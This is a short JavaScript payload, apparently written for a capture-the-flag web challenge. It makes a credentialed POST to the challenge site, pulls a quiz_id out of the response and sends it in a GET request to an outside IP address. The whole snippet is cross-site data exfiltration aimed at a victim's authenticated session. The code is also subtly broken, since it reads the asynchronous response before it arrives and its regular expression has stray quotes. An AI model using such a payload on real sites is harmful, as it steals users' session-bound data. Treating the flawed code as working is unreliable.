var xhr = new XMLHttpRequest();
xhr.open("POST","https://chal02-classquiz.ctf.pwnable.hk/",true);
xhr.withCredentials=true;
xhr.send(JSON.stringify({"test":"1"}));
var xhr2 = new XMLHttpRequest();
xhr2.open("GET","http://106.53.135.66/?"+xhr.responseText.match('quiz_id=\s+''));
xhr2.send()